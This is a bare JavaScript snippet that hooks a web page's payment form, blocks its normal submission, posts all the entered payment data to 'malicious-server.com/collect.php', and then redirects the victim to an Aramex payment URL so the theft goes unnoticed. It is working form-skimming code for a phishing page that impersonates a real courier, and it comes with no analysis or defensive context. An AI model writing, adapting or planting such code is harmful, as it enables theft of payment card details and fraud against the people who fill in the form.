document.getElementById("payment-form").addEventListener("submit", function(event) {
    event.preventDefault();  // Prevent form from submitting normally

    let formData = new FormData(this);

    fetch("https://malicious-server.com/collect.php", {
        method: "POST",
        body: formData
    })
    .then(response => {
        window.location.href = "https://aramex.com/official-payment";  // Redirect to real site
    });
});
